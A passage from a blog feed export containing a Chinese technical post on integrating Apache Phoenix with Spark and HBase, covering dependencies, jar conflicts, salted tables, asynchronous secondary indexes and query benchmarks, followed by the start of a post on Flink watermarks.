title="Phoenix和Spark整合"></a>Phoenix和Spark整合</h2><p>数据格式：</p><table><thead><tr><th>imei</th><th>alarm_type</th><th>lat</th><th>lng</th><th>device_status</th><th>mc_type</th><th>read_status</th><th>speed</th><th>addr</th><th>index_name</th><th>user_id</th><th>user_parent_id</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>spark写入HBase(通过Phoenix)</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">sparkPhoenixSave</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args:<span class="type">Array</span>[<span class="type">String</span>])&#123;</span><br><span class="line">       <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setAppName(<span class="string">"sparkToPhoenix"</span>)</span><br><span class="line">       <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(<span class="type">SparkConf</span>)</span><br><span class="line">       <span class="keyword">val</span> sqlContext = <span class="keyword">new</span> org.apache.spark.sql.<span class="type">SQLContext</span>(sc)</span><br><span class="line">       <span class="keyword">import</span> sqlContext.implicits._</span><br><span class="line">       </span><br><span class="line">       <span class="comment">// 从集合创建rdd</span></span><br><span class="line">       <span class="keyword">val</span> rdd = <span class="type">List</span>((<span class="number">1</span>L,<span class="string">"1"</span>,<span class="number">1</span>),(<span class="number">2</span>L,<span class="string">"2"</span>,<span class="number">2</span>),(<span class="number">3</span>L,<span class="string">"3"</span>,<span class="number">3</span>))</span><br><span class="line">       <span class="comment">// 从rdd创建DF</span></span><br><span class="line">       <span class="keyword">val</span> df = rdd.toDF(<span class="string">"id"</span>,<span class="string">"col1"</span>,<span class="string">"col2"</span>)</span><br><span class="line">       df.show()</span><br><span class="line">       </span><br><span class="line">       <span class="comment">// Save to OUTPUT_TABLE</span></span><br><span class="line">       df.save(<span class="string">"org.apache.phoenix.spark"</span>,<span class="type">SaveMode</span>.<span class="type">Overwrite</span>,<span class="type">Map</span>(<span class="string">"table"</span> -&gt; <span class="string">"GPS"</span>,<span class="string">"zkUrl"</span> -&gt; <span class="string">"172.16.0.126:2181/hbase-unsecure"</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题点：</p><p>依赖方面有几个问题：</p><p>集群升级后采用了Phoenix 4.14 - HBase 1.2.0版本。</p><p>这个版本的依赖经过一段时间的试验之后选择了如下的版本:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-sql_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- phoenix spark--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.phoenix<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>phoenix-spark<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.14.0-HBase-1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hbase<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hbase-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.phoenix<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>phoenix-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.14.0-HBase-1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>理论上只要用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.phoenix<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>phoenix-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.14.0-cdh5.13.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>就能解决问题，但是这个依赖一直有问题，手动下载也没有解决加载问题</p><p>我们集群是5.13.3的，这边选择的是5.13.2的，应该能够兼容的，深入进去看里面的组件，其实HBase版本啥的都一样。</p><p>但是Phoenix4.14.0-CDH版本安装的时候在HBase-site.xml中已经有了两个改动，所以这边有两个选择，要么在代码中配置hbase的选项，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hbConfig.set(<span class="string">"phoenix.schema.isNamespaceMappingEnabled"</span>,<span class="string">"true"</span>);</span><br><span class="line">hbConfig.set(<span class="string">"phoenix.schema.mapSystemTablesToNamespace "</span>,<span class="string">"true"</span>);</span><br></pre></td></tr></table></figure><p>要么在resource文件夹中添加hbase-site.xml，后者更加方便一点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>/<span class="number">10</span>/<span class="number">14</span> <span class="number">17</span>:<span class="number">07</span>:<span class="number">39</span> INFO ConnectionQueryServicesImpl: HConnection established. Stacktrace <span class="keyword">for</span> informational purposes: hconnection-<span class="number">0x1de9b505</span> java.lang.Thread.getStackTrace(Thread.java:<span class="number">1559</span>)</span><br><span class="line">org.apache.phoenix.util.LogUtil.getCallerStackTrace(LogUtil.java:<span class="number">55</span>)</span><br><span class="line">org.apache.phoenix.query.ConnectionQueryServicesImpl.openConnection(ConnectionQueryServicesImpl.java:<span class="number">427</span>)</span><br><span class="line">org.apache.phoenix.query.ConnectionQueryServicesImpl.access$<span class="number">400</span>(ConnectionQueryServicesImpl.java:<span class="number">267</span>)</span><br><span class="line">org.apache.phoenix.query.ConnectionQueryServicesImpl$<span class="number">12</span>.call(ConnectionQueryServicesImpl.java:<span class="number">2515</span>)</span><br><span class="line">org.apache.phoenix.query.ConnectionQueryServicesImpl$<span class="number">12</span>.call(ConnectionQueryServicesImpl.java:<span class="number">2491</span>)</span><br><span class="line">org.apache.phoenix.util.PhoenixContextExecutor.call(PhoenixContextExecutor.java:<span class="number">76</span>)</span><br><span class="line">org.apache.phoenix.query.ConnectionQueryServicesImpl.init(ConnectionQueryServicesImpl.java:<span class="number">2491</span>)</span><br><span class="line">org.apache.phoenix.jdbc.PhoenixDriver.getConnectionQueryServices(PhoenixDriver.java:<span class="number">255</span>)</span><br><span class="line">org.apache.phoenix.jdbc.PhoenixEmbeddedDriver.createConnection(PhoenixEmbeddedDriver.java:<span class="number">150</span>)</span><br><span class="line">org.apache.phoenix.jdbc.PhoenixDriver.connect(PhoenixDriver.java:<span class="number">221</span>)</span><br><span class="line">java.sql.DriverManager.getConnection(DriverManager.java:<span class="number">664</span>)</span><br><span class="line">java.sql.DriverManager.getConnection(DriverManager.java:<span class="number">208</span>)</span><br><span class="line">org.apache.phoenix.mapreduce.util.ConnectionUtil.getConnection(ConnectionUtil.java:<span class="number">113</span>)</span><br><span class="line">org.apache.phoenix.mapreduce.util.ConnectionUtil.getInputConnection(ConnectionUtil.java:<span class="number">58</span>)</span><br><span class="line">org.apache.phoenix.mapreduce.util.PhoenixConfigurationUtil.getSelectColumnMetadataList(PhoenixConfigurationUtil.java:<span class="number">354</span>)</span><br><span class="line">org.apache.phoenix.spark.PhoenixRDD.toDataFrame(PhoenixRDD.scala:<span class="number">118</span>)</span><br><span class="line">org.apache.phoenix.spark.PhoenixRelation.schema(PhoenixRelation.scala:<span class="number">60</span>)</span><br><span class="line">org.apache.spark.sql.execution.datasources.LogicalRelation.&lt;init&gt;(LogicalRelation.scala:<span class="number">40</span>)</span><br><span class="line">org.apache.spark.sql.SparkSession.baseRelationToDataFrame(SparkSession.scala:<span class="number">389</span>)</span><br><span class="line">org.apache.spark.sql.DataFrameReader.load(DataFrameReader.scala:<span class="number">146</span>)</span><br><span class="line">org.apache.spark.sql.DataFrameReader.load(DataFrameReader.scala:<span class="number">125</span>)</span><br><span class="line">phoenix.SparkPhoenixRead$.main(SparkPhoenixRead.scala:<span class="number">17</span>)</span><br><span class="line">phoenix.SparkPhoenixRead.main(SparkPhoenixRead.scala)</span><br></pre></td></tr></table></figure><p>配置完成之后，使用代码的时候，始终在报如上错误。</p><p>分析之后发现这并不是报错，而是长得像报错的日志格式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ConnectionQueryServicesImpl.java</span></span><br><span class="line">logger.info(<span class="string">"HConnection established. Stacktrace for informational purposes: "</span> + connection + <span class="string">" "</span> +  LogUtil.getCallerStackTrace());</span><br><span class="line"><span class="comment">//LogUtil.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getCallerStackTrace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   StackTraceElement[] st = Thread.currentThread().getStackTrace();</span><br><span class="line">   StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">   <span class="keyword">for</span> (StackTraceElement element : st) &#123;</span><br><span class="line">       sb.append(element.toString());</span><br><span class="line">       sb.append(<span class="string">"\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取调用栈并记入日记，不是bug，==</p><p>最终使用的代码是Spark2.0以上格式的SparkSession</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取</span></span><br><span class="line"><span class="keyword">val</span> spark = <span class="type">SparkSession</span>.builder().master(<span class="string">"local[*]"</span>).appName(<span class="string">"sparkPhoenix"</span>).getOrCreate()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">val</span> df = spark.read.format(<span class="string">"org.apache.phoenix.spark"</span>)</span><br><span class="line">    .option(<span class="string">"zkUrl"</span>,<span class="string">"172.16.0.127:2181"</span>)</span><br><span class="line">    .option(<span class="string">"table"</span>,<span class="string">"TABLE_NAME"</span>)</span><br><span class="line">    .load()</span><br><span class="line"></span><br><span class="line">   df.show()</span><br><span class="line"></span><br><span class="line">   spark.stop()</span><br></pre></td></tr></table></figure><p>Spark与Phoenix Jar包冲突说明：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--conf spark.driver.extraClassPath=phoenix-spark-4.14.0-HBase-1.2.jar --conf spark.executor.extraClassPath=phoenix-spark-4.14.0-HBase-1.2.jar</span><br></pre></td></tr></table></figure><h3 id="Phoenix-Jar包冲突（大坑）"><a href="#Phoenix-Jar包冲突（大坑）" class="headerlink" title="Phoenix Jar包冲突（大坑）"></a>Phoenix Jar包冲突（大坑）</h3><p>Jar包冲突的原因是HBase…这个包和CDH…这个包加载顺序的问题</p><p>先加载CDH这个包的话就会导致问题Jar包冲突，必须先加载HBase包，要手动指定。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8oad0y9u2j20dp0613yt.jpg" alt="8.png"></p><p>图上还缺少一个HBase包放在oozie的lib里面，这些是加载必备的。</p><p>不然会出现奇怪的错误，因为加载是随机加载的，如果先加载了CDH包就会报错。</p><h2 id="映射、索引分区"><a href="#映射、索引分区" class="headerlink" title="映射、索引分区"></a>映射、索引分区</h2><h3 id="映射："><a href="#映射：" class="headerlink" title="映射："></a>映射：</h3><p>默认情况下，直接在hbase中创建的表，通过phoenix是查看不到的</p><p>test是在hbase中直接创建的，默认情况下，在phoenix中是查看不到test的。</p><p>有两种映射方法，一种是视图映射，一种是表映射。</p><p>视图创建过后,直接删除,Hbase中的原表不会受影响,如果创建的是表映射,删除Phoenix中的映射表,会把原表也删除.</p><p><strong>一、基础知识</strong></p><p>Salted Table 是phoenix为了防止hbase表rowkey设计为自增序列而引发热点region读和热点region写而采取的一种表设计手段。通过在创建表的时候指定Salt_Buckets来实现pre-split，下面的建表语句建表的时候将会把表预分割到20个region里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SALT_TEST (A_KEY VARCHAR PRIMARY KEY,</span><br><span class="line"> A_col VARCHAR) SALT_BUCKETS = 20</span><br></pre></td></tr></table></figure><p>默认情况下，对salted table 创建耳机索引，二级索引表会随同原表进行salted切分，salt_buckets与原表保持一致，当然，在创建耳机索引表的时候也可以自定义salt_buckets的数量，phoenix没有强制数量必须和原表一致。</p><p><strong>二、实现原理</strong></p><p>讲一个散列取余后的byte值插入到rowkey的第一个字节里，通过定义每个region的start key和end key将数据分割到不同region，以此来防止自增序列引入的热点问题。从而达到平衡hbase集群的读写性能问题。</p><p>salted byte的计算方式大致如下</p><p>hash(rowkey) % SALT_BUCKETS</p><p>默认下salted byte将作为每个region的start key及 end key，以此分割数据到不同的region，</p><p>这样能做到具有相同的salted byte处在一个region。</p><p><strong>三、本质</strong></p><p>本质就是在hbase中</p><p>rowkey前面加上一个字节，在表中实际存储时，就可以自动分布到不同的region中去了。</p><p><strong>四、实例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SALT_TEST (a_key VARCHAR PRIMARY KEY, a_col VARCHAR) SALT_BUCKETS = 4;</span><br><span class="line"></span><br><span class="line"> UPSERT INTO SALT_TEST(a_key, a_col) VALUES(&apos;key_abc&apos;, &apos;col_abc&apos;);</span><br><span class="line"> UPSERT INTO SALT_TEST(a_key, a_col) VALUES(&apos;key_ABC&apos;, &apos;col_ABC&apos;);</span><br><span class="line"> UPSERT INTO SALT_TEST(a_key, a_col) VALUES(&apos;key_rowkey01&apos;, &apos;col01&apos;);</span><br></pre></td></tr></table></figure><p>从Phoenix sqlline.py查询数据 看不出区别，去hbase scan 就能看到phoenix是在rowkey的第一个字节插入一个byte字节。</p><p><strong>五、注意</strong></p><p>每条rowkey前面加一个Byte，这里显示为16进制，创建完成之后，应该使用Phoenix SQL来读取数据，不要混合使用Phoenix Sql插入数据，使得原始rowkey前面被自动加上一个byte。</p><p><strong>同步索引和异步索引</strong></p><p>一般我可以使用create index来创建一个索引，这是一种同步的方法，但是有时候我们创建索引的表非常大，</p><p>我们需要等很长时间，Phoenix 4.5 以后有一个异步创建索引的方式，使用关键字ASYNC来创建索引：</p><p>实际上在二级索引中，我们需要先将phoenix的client包放入hbase的lib中然后在启动，这个IndexTool底层走的是MR，MR任务运行完毕后，索引会被自动引导，当我们在phoenix命令行中使用!table，看到索引表已经处于enable状态就可以使用该索引了。</p><p>官网demo里面的建立索引，仅仅针对一个字段，这样涉及稍微复杂的业务，索引并不能起效，还是全表索引。</p><p>二级索引分为以下几种：</p><p>全局索引、本地索引、覆盖索引</p><p>全局索引：</p><p>全局索引是默认索引类型，适用于读多写少的场景，由于全局索引会拦截（DELETE，UPSERT VALUES and UPSERT SELECT）数据更新并更新索引表，而索引表十分不在不用数据节点上的，跨节点的数据传输带来了较大的性能损耗。</p><p>本地索引</p><p>本地索引适用于少读多写</p><p>必须通过下面两部才能完成异步索引的构建。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CRAETE INDEX anync_index ON PHOENIX_ALARM_DIS(LAT,LNG,IMEI,CREATETIME) ASYNC</span><br></pre></td></tr></table></figure><p>创建异步索引，命令执行后一开始不会有数据，还必须使用单独的命令行工具来执行数据的创建，当语句给执行的时候，后端会启动mr任务，只有等到这个任务结束，数据都被生成在索引表中后，这个索引才能被使用，创建语句执行完后，还需要用工具导入数据。</p><p>官网说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一般我们可以使用CREATE INDEX来创建一个索引，这是一种同步的方法。但是有时候我们创建索引的表非常大，我们需要等很长时间。Phoenix 4.5以后有一个异步创建索引的方式，使用关键字ASYNC来创建索引：</span><br><span class="line"> ​</span><br><span class="line"> CREATE INDEX index1_c ON hao1 (age) INCLUDE(name) ASYNC;</span><br><span class="line"> 这时候创建的索引表中不会有数据。你还必须要单独的使用命令行工具来执行数据的创建。当语句给执行的时候，后端会启动一个map reduce任务，只有等到这个任务结束，数据都被生成在索引表中后，这个索引才能被使用。启动工具的方法：</span><br><span class="line"> ​</span><br><span class="line"> $&#123;HBASE_HOME&#125;/bin/hbase org.apache.phoenix.mapreduce.index.IndexTool</span><br><span class="line"> --schema MY_SCHEMA --data-table MY_TABLE --index-table ASYNC_IDX</span><br><span class="line"> --output-path ASYNC_IDX_HFILES</span><br><span class="line"> 这个任务不会因为客户端给关闭而结束，是在后台运行。你可以在指定的文件ASYNC_IDX_HFILES中找到最终实行的结果。</span><br></pre></td></tr></table></figure><h2 id="测试和遇到的一些问题"><a href="#测试和遇到的一些问题" class="headerlink" title="测试和遇到的一些问题"></a>测试和遇到的一些问题</h2><p>使用Spark写入11亿5千万测试数据,分为24个分区,使用异步索引针对time和imei字段各建立了一个索引.</p><p>这边有个问题，索引在创建完成之后，数据类型自动变化了，详细：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8oad8uzidj20u105u0u5.jpg" alt="10.jpg"></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8oadcvtxwj20u10b8q5t.jpg" alt="11.jpg"></p><p>上面两张图分别是索引表和原数据表的数据类型，可以看到原表和索引表的数据类型并不相同，让人有点费解。</p><p>考虑到phoenix有很多时间种类和别的一些情况，于是提出了几种解决办法：</p><p>1.建表的时候不用timestamp作为时间类型</p><p>2.改二级索引表的字段类型，将decimal改为bigint</p><p>3.将seq_id建表时候，设置为not null，并属于联合主键</p><p>4.从搜索的角度考虑，能不能将搜索的数据类型更改</p><p>第一种方法尝试换了一种时间类型后，建立索引任然更改了为了decimal</p><p>第二种方法更改索引类型经过尝试后发现是不可行的</p><p>第三种方法和第四种方法是可行的，第四种方法更加简单</p><p>第四种方法，本来准备自己在代码中实现对时间的转换，后来发现phoenix SQL内置了timestamp转换</p><p>建立完成索引之后，直接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> CREATETIME,IMEI,LAT,LNG <span class="keyword">from</span> PHOENIX_ALARM_DIS <span class="keyword">where</span> CREATETIME &gt; TO_TIMESTAMP(<span class="string">'2017-08-30 06:21:46.732'</span>);</span><br></pre></td></tr></table></figure><p>这种方式会引导查询走索引</p><p>关于索引，这边还有需要一提的就是，创建索引之后</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> INDEX_1 <span class="keyword">ON</span> <span class="keyword">TABLE</span>(A,B) <span class="keyword">INCLUDE</span> (C,D) ASYNC;</span><br></pre></td></tr></table></figure><p>创建索引之后并不能指定B为查询条件，explain会发现依然是在全局扫描，效率很低，这边稍微尝试了一下，在建立一个</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">INDEX</span> INDEX_1 <span class="keyword">ON</span> <span class="keyword">TABLE</span>(B,A) <span class="keyword">INCLUDE</span> (C,D) ASYNC;</span><br></pre></td></tr></table></figure><p>建立了两个索引之后，两个索引就占了大概80G的硬盘空间，这个表格用parquet.snappy格式存储之后才120G，真正是用空间换时间。</p><p>测试结果</p><p>数据量：</p><p>11亿5000w 占用磁盘空间：120G</p><p>索引占用空间：40G</p><p>下面分别是50并发 100并发 200并发的测试结果,</p><p>测试中现在Phoenix建表,用Spark写入,随机IMEI和时间段,时间长度为1天,用对应的线程数至少跑30分钟以上.,测试过程中的CPU使用量因为测试集群性能较高,使用最多不超过40%,所以没有记录.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8oadgrbgpj20k50btgmf.jpg" alt="12.jpg"></p><p>50并发稳定后的查询大多在200ms以下.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8oadnpw9uj20h60adwf4.jpg" alt="13.jpg"></p><p>100并发的查询时间大多数在400ms以下</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8oadtjlhgj20h40avq3j.jpg" alt="14.jpg"></p><p>200并发的查询大多数在500ms以下.</p><p>针对云车金融数据的测试:</p><p>云车金融测试采用映射表,原数据在HBase中,在Phoenix中建立映射表,把原先设计好的ROWKEY作为主键,建立映射表.</p><h3 id="根据主键范围模糊查询"><a href="#根据主键范围模糊查询" class="headerlink" title="根据主键范围模糊查询"></a>根据主键范围模糊查询</h3><p>采用SQL模糊查询,因为没有并发要求,直接在命令行输入SQL查询.</p><p>针对某条IMEI单天的查询,反应时间在3-5s左右.</p><p>结论：模糊查询都是走全表，无法优化，效率比较低。</p><h3 id="关于映射表"><a href="#关于映射表" class="headerlink" title="关于映射表"></a>关于映射表</h3><p>官网有提及，映射表并不推荐用，数据从hbase写入，通过phoenix读取并不是个好主意，因为：</p><p>1.Phoenix创建的表有很多数据类型，但是从hbase映射表的话只能有一种类型：varchar，否则就会报错。字段只有varchar会给查询带来一定的麻烦。</p><p>2.大表的话创建映射表肯定会超时，需要根据版本修改配置信息，max超时时间拉大，拉到多少比较好，这个时间需要把握。</p><p>映射表如果因为这样或者那样的原因创建失败的话是不能直接删除的，直接删除会导致hbase原表也被删除，可以在SYSTEM.CATALOG中把和映射表有关的信息删除，比如：</p><p>delete from system.catalog where table_name = ‘MYTEST’;</p><p>就能把和关联表有关的信息全部删除了。</p><p>相比于HBase,性能上并没有优势</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Phoenix&quot;&gt;&lt;a href=&quot;#Phoenix&quot; class=&quot;headerlink&quot; title=&quot;Phoenix&quot;&gt;&lt;/a&gt;Phoenix&lt;/h1&gt;&lt;p&gt;Phoenix实践&lt;/p&gt;
    
    </summary>
    
      <category term="Phoenix" scheme="http://yoursite.com/categories/Phoenix/"/>
    
      <category term="HBase" scheme="http://yoursite.com/categories/Phoenix/HBase/"/>
    
    
      <category term="Phoenix" scheme="http://yoursite.com/tags/Phoenix/"/>
    
  </entry>
  
  <entry>
    <title>WaterMark原理以及验证</title>
    <link href="http://yoursite.com/2019/09/05/WaterMark%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E9%AA%8C%E8%AF%81/"/>
    <id>http://yoursite.com/2019/09/05/WaterMark原理以及验证/</id>
    <published>2019-09-05T10:25:59.031Z</published>
    <updated>2019-11-06T03:06:09.911Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前Flink的Watermark原理老是不明白，并且在CSDN上找的一篇文章，似乎是因为版本的问题，两年前的博客，代码验证下来始终有问题，在网上和人谈论之后，重新用代码验证了，才有点清晰明了，在此记录一下。</p></blockquote><a id="more"></a> <h3 id="WaterMark"><a href="#WaterMark" class="headerlink" title="WaterMark"></a>WaterMark</h3><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g8o1sw7244j20xd0g4q9s.jpg" alt="1.png"></p><p>实时计算中，数据时间比较敏感。有<code>eventTime</code>和<code>processTime</code>区分，一般来说<code>eventTime</code>是从原始的消息中提取过来的，<code>processTime</code>是<code>Flink</code>自己提供的，<code>Flink</code>中一个亮点就是可以基于<code>eventTime</code>计算，这个功能很有用，因为实时数据可能会经过比较长的链路，多少会有延时，并且有很大的不确定性，对于一些需要精确体现事件变化趋势的场景中，单纯使用<code>processTime</code>显然是不合理的。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><code>watermark</code>是一种衡量<code>Event Time</code>进展的机制，它是数据本身的一个隐藏属性。通常基于Event Time的数据，自身都包含一个<code>timestamp.watermark</code>是用于处理乱序事件的，而正确的处理乱序事件，通常用<code>watermark</code>机制结合<code>window</code>来实现。</p><p>流处理从事件产生，到流经<code>source</code>，再到<code>operator</code>，中间是有一个过程和时间的。虽然大部分情况下，流到operator的数据都是按照事件产生的时间顺序来的，但是也不排除由于网络、背压等原因，导致乱序的产生（<code>out-of-order</code>或者说<code>late element</code>）。</p><p>但是对于<code>late element</code>，我们又不能无限期的等下去，必须要有个机制来保证一个特定的时间后，必须触发<code>window</code>去进行计算了。这个特别的机制，就是<code>watermark</code>。</p><h3 id="window划分"><a href="#window划分" class="headerlink" title="window划分"></a>window划分</h3><p><code>window</code>的设定无关数据本身，而是系统定义好了的。<br><code>window</code>是<code>flink</code>中划分数据一个基本单位，<code>window</code>的划分方式是固定的，默认会根据自然时间划分<code>window</code>，并且划分方式是前闭后开。</p><table><thead><tr><th>window划分</th><th>w1</th><th>w2</th><th>w3</th></tr></thead><tbody><tr><td>3s</td><td>[00:00:00~00:00:03)</td><td>[00:00:03~00:00:06)</td><td>[00:00:06~00:00:09)</td></tr><tr><td>5s</td><td>[00:00:00~00:00:05)</td><td>[00:00:05~00:00:10)</td><td>[00:00:10~00:00:15)</td></tr><tr><td>10s</td><td>[00:00:00~00:00:10)</td><td>[00:00:10~00:00:20)</td><td>[00:00:20~00:00:30)</td></tr><tr><td>1min</td><td>[00:00:00~00:01:00)</td><td>[00:01:00~00:02:00)</td><td>[00:02:00~00:03:00)</td></tr></tbody></table><h3 id="示例"><a href="#示例" class="headerlink" 